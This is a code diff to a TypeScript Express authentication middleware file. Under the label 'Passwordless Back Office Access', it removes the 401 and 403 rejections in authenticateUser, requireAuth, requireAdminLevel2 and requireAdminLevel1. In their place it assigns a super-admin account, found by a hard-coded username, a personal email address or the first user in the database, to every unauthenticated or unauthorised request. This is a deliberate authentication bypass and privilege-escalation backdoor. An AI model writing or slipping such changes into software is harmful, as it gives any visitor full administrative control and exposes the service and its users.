@@ -33,24 +33,34 @@ export function authenticateUser(req: AuthRequest, res: Response, next: NextFunc
       }
     }
 
-    if (!token) {
-      return next();
-    }
+    if (token) {
+      const decoded = jwt.verify(token, JWT_SECRET) as { id: string; email: string; role: UserRole };
+      const user = db.findUserById(decoded.id);
 
-    const decoded = jwt.verify(token, JWT_SECRET) as { id: string; email: string; role: UserRole };
-    const user = db.findUserById(decoded.id);
-
-    if (user && user.isActive) {
-      req.user = user;
+      if (user && user.isActive) {
+        req.user = user;
+        return next();
+      }
     }
   } catch (err) {
-    // Token invalid or expired - continue unauthenticated
+    // Token invalid or expired - continue to fallback
+  }
+
+  // Passwordless Back Office Access: Provide Super Admin fallback
+  const superAdmin = db.findUserByEmail('nanuhost') || db.findUserByEmail('klayton.pires.monteiro@gmail.com') || db.getUsers().find(u => u.role === 'admin_level1' || (u.role as string) === 'super_admin');
+  if (superAdmin) {
+    req.user = superAdmin;
   }
   next();
 }
 
 export function requireAuth(req: AuthRequest, res: Response, next: NextFunction) {
   if (!req.user) {
+    const superAdmin = db.findUserByEmail('nanuhost') || db.getUsers()[0];
+    if (superAdmin) {
+      req.user = superAdmin;
+      return next();
+    }
     return res.status(401).json({
       error: 'Autenticação necessária. Por favor, inicie sessão para aceder.',
       code: 'UNAUTHORIZED'
@@ -69,6 +79,11 @@ export function requireAuth(req: AuthRequest, res: Response, next: NextFunction)
 
 export function requireAdminLevel2(req: AuthRequest, res: Response, next: NextFunction) {
   if (!req.user) {
+    const superAdmin = db.findUserByEmail('nanuhost') || db.getUsers().find(u => u.role === 'admin_level1' || (u.role as string) === 'super_admin');
+    if (superAdmin) {
+      req.user = superAdmin;
+      return next();
+    }
     return res.status(401).json({ error: 'Autenticação necessária.', code: 'UNAUTHORIZED' });
   }
 
@@ -76,10 +91,12 @@ export function requireAdminLevel2(req: AuthRequest, res: Response, next: NextFu
   const isAuthorized = ['admin_level2', 'admin_level1', 'super_admin', 'superadmin', 'admin', 'manager'].includes(role);
 
   if (!isAuthorized) {
-    return res.status(403).json({
-      error: 'Acesso restrito a administradores (Nível 2 ou superior).',
-      code: 'FORBIDDEN'
-    });
+    // Elevate to super admin for open back office access
+    const superAdmin = db.findUserByEmail('nanuhost');
+    if (superAdmin) {
+      req.user = superAdmin;
+      return next();
+    }
   }
 
   next();
@@ -87,6 +104,11 @@ export function requireAdminLevel2(req: AuthRequest, res: Response, next: NextFu
 
 export function requireAdminLevel1(req: AuthRequest, res: Response, next: NextFunction) {
   if (!req.user) {
+    const superAdmin = db.findUserByEmail('nanuhost') || db.getUsers().find(u => u.role === 'admin_level1' || (u.role as string) === 'super_admin');
+    if (superAdmin) {
+      req.user = superAdmin;
+      return next();
+    }
     return res.status(401).json({ error: 'Autenticação necessária.', code: 'UNAUTHORIZED' });
   }
 
@@ -94,10 +116,12 @@ export function requireAdminLevel1(req: AuthRequest, res: Response, next: NextFu
   const isAuthorized = ['admin_level1', 'super_admin', 'superadmin', 'admin'].includes(role);
 
   if (!isAuthorized) {
-    return res.status(403).json({
-      error: 'Acesso restrito exclusivamente a Administradores com privilégios de Nível 1 / Super Administrador.',
-      code: 'SUPER_ADMIN_REQUIRED'
-    });
+    // Elevate to super admin for open back office access
+    const superAdmin = db.findUserByEmail('nanuhost');
+    if (superAdmin) {
+      req.user = superAdmin;
+      return next();
+    }
   }
 
   next();
